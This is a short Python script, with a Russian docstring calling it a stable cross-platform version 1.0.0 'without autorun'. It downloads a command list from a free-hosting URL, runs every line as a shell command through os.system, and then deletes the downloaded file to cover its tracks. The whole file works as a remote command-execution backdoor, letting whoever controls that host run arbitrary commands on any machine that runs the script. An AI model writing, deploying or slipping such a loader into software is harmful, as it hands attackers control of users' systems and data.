'''
версия 1.0.0
стабильная
кросплотформенная
без автозапуска
'''
import re, os, requests

def get_html(url):
	r = requests.get(url)
	list1 = open("command.listc",'w')
	list1.write(r.text)
	list1.close()
	lst1 = open("command.listc")
	return lst1.readlines()

def mission(stur):
	for wew in range(0,len(stur)):
		pattern = r"\n"
		os.system(re.sub(pattern, "", stur[wew]))

def main():
	wer = get_html('https://rstiller.000webhostapp.com/ret.yu')
	mission(wer)
	os.remove("command.listc")

if __name__ == '__main__':
	main()